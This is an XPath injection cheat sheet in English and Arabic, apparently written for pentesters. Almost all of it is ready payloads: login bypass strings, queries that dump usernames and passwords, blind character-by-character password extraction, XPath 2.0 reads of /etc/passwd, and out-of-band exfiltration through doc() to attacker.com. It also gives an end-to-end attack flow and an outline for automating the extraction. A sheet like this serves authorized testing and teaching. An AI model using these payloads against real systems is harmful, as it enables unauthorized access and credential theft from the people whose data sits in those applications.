




# 🧠 XPATH INJECTION –  SHEET

---

# 1️⃣ Recon – فين أدور أصلاً؟

## 🎯 الأماكن الشائعة للثغرة

- Login Forms
    
- Search Forms
    
- Filter / Sort parameters
    
- Forgot Password
    
- XML-based APIs
    
- SOAP endpoints
    
- Legacy admin panels
    

### 🔎 Indicators إن الموقع بيستخدم XML/XPath

- Response فيه XML structure
    
- SOAP requests
    
- Headers فيها:
    
    ```
    Content-Type: text/xml
    application/xml
    ```
    
- Error فيه كلمات زي:
    
    - XPathException
        
    - Invalid predicate
        
    - XQuery error
        

---

# 2️⃣ Detection Phase (اكتشاف الثغرة)

## 🧪 Basic Payloads

جرب تدخل:

```
' or '1'='1
' or ''='
x' or 1=1 or 'x'='y
/
//
//*
*/*
@*
count(/child::node())
x' or name()='username' or 'x'='y
' and count(/*)=1 and '1'='1
' and count(/@*)=1 and '1'='1
' and count(/comment())=1 and '1'='1
')] | //user/*[contains(*,'
') and contains(../password,'c
') and starts-with(../password,'c
```


---

# 1️⃣ XPath QUICK REFERENCE (الأساس)

## 🎯 Node Selection

|Syntax|Meaning|
|---|---|
|`/`|From root|
|`//`|Anywhere in document|
|`.`|Current node|
|`..`|Parent node|
|`@`|Attribute|
|`*`|Any element|
|`node()`|Any node|

---

## 🎯 Core Useful Functions

```xpath
count()
name()
string-length()
substring()
position()
last()
contains()
```

---

# 2️⃣ VULNERABLE QUERY PATTERN

أغلب الثغرات بتكون بالشكل ده:

```xpath
string(//user[name/text()='USER' and password/text()='PASS']/account/text())
```

أو:

```php
'/usuarios/usuario[cuenta="' . $_POST['user'] . '" and passwd="' . $_POST['passwd'] . '"]'
```

💥 المدخلات بتتحط مباشرة داخل XPath.

---

## 🧨 Confirm XPath (مش SQL)

جرب:

```
' or count(//*)>0 or '
```

لو اشتغل → XPath confirmed.

---

# 4️⃣ AUTHENTICATION BYPASS

## 💣 Universal Payloads

```
' or '1'='1
" or "1"="1
' or true() or '
' or 1 or '
```

لو التطبيق بيرجع أول match → دخلت كأول يوزر.

---

## 🎯 Select Specific User

```
'or position()=2 or'
'or contains(name,'adm') or'
```

---

## 🎯 Known Username

```
admin' or '
admin' or '1'='2
```

---

# 5️⃣ DATA EXTRACTION (VISIBLE OUTPUT)

## 🎯 Dump all users

```
')] | //user/name[('')=('
```

## 🎯 Dump passwords

```
')] | //user/password[('')=('
```

## 🎯 Dump everything

```
')] | //node()[('')=('
```

---

# 6️⃣ BLIND XPATH INJECTION

(مفيش output غير True/False)

---

## 🪜 Step 1 — Get Length

```xpath
' or string-length(//user[1]/password)=6 or ''='
```

---

## 🪜 Step 2 — Extract Characters

```xpath
' or substring(//user[1]/password,1,1)='a' or ''='
```

كرر لكل position.

---

## 🚀 Faster Method (Binary Search)

```xpath
' or substring(//user[1]/password,1,1) > 'm' or ''='
```

تقسم alphabet نصين.

---

# 7️⃣ SCHEMA DISCOVERY (Blind Crawling)

## 🎯 Count root children

```xpath
count(/*)
```

## 🎯 Count children of first node

```xpath
count(/*[1]/*)
```

## 🎯 Recursively descend

```xpath
count(/*[1]/*[1]/*)
```

تكرر لحد ما توصل leaf.

---

## 🎯 Discover node name

```xpath
name(/*[1])
```

## 🎯 Extract node name char-by-char

```xpath
substring(name(/*[1]),1,1)
```

---

# 8️⃣ XPATH 2.0 ATTACKS (لو متاحة)

## 📂 File Read

```xpath
doc('file:///etc/passwd')
```

Blind:

```xpath
substring(doc('file:///etc/passwd')/*[1]/text()[1],1,1)
```

---

## 🌍 OOB Exfiltration

```xpath
doc(concat("http://attacker.com/", /user[1]/name))
```

أو:

```xpath
doc-available(concat("http://attacker.com/", DATA))
```

---

# 9️⃣ NULL BYTE BYPASS

```
' or 1]%00
```

يقطع بقية الاستعلام.

---

# 🔟 ERROR BASED (XPath 2.0)

```xpath
if ($user/role=2) then error() else 0
```

لو حصل Error → الشرط True.

---

# 1️⃣1️⃣ AUTOMATION LOGIC

### Script flow:

1. Detect injection
    
2. Determine blind or visible
    
3. Get length
    
4. Loop position
    
5. Loop charset
    
6. Build string
    

---

# 1️⃣2️⃣ COMPLETE ATTACK FLOW

```
[Input Injection]
        ↓
[Confirm XPath]
        ↓
[Auth Bypass]
        ↓
[Visible?]
   ↓            ↓
Yes           Blind
↓              ↓
Dump         Length → Char → Full Extract
        ↓
Check XPath 2.0
        ↓
File Read / OOB
```

---

# 1️⃣3️⃣ SEVERITY CHECK

|Impact|Level|
|---|---|
|Login Bypass|High|
|Extract credentials|Critical|
|Full XML dump|Critical|
|File read|Critical|
|SSRF|Critical|

---

# 🏁 ULTRA QUICK MINI REFERENCE

```
Bypass → ' or '1'='1
Length → string-length()
Char   → substring()
Count  → count()
Name   → name()
File   → doc()
OOB    → doc-available()
```

---

## References

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection)
- https://book.hacktricks.wiki/en/pentesting-web/xpath-injection.html
- [https://wiki.owasp.org/index.php/Testing_for_XPath_Injection_(OTG-INPVAL-010)](https://wiki.owasp.org/index.php/Testing_for_XPath_Injection_\(OTG-INPVAL-010\))
- [https://www.w3schools.com/xml/xpath_syntax.asp](https://www.w3schools.com/xml/xpath_syntax.asp)